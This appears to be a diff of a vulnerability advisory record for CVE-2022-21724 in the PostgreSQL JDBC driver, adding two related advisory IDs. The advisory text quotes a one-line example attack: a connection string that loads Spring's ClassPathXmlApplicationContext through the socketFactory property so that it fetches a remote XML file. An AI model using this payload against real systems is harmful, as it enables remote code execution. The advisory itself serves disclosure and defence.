@@ -7,6 +7,10 @@
 		"BIT-postgresql-jdbc-driver-2022-21724",
 		"CVE-2022-21724"
 	],
+	"related": [
+		"CGA-4p65-rcvr-255v",
+		"CGA-hwwj-wh5j-p2rj"
+	],
 	"summary": "pgjdbc Does Not Check Class Instantiation when providing Plugin Classes",
 	"details": "### Impact\n\npgjdbc instantiates plugin instances based on class names provided via `authenticationPluginClassName`, `sslhostnameverifier`, `socketFactory`, `sslfactory`, `sslpasswordcallback` connection properties.\n\nHowever, the driver did not verify if the class implements the expected interface before instantiating the class.\n\nHere's an example attack using an out-of-the-box class from Spring Framework:\n\n```\nDriverManager.getConnection(\"jdbc:postgresql://node1/test?socketFactory=org.springframework.context.support.ClassPathXmlApplicationContext&socketFactoryArg=http://target/exp.xml\");\n```\n\nThe first impacted version is REL9.4.1208 (it introduced `socketFactory` connection property)",
 	"severity": [
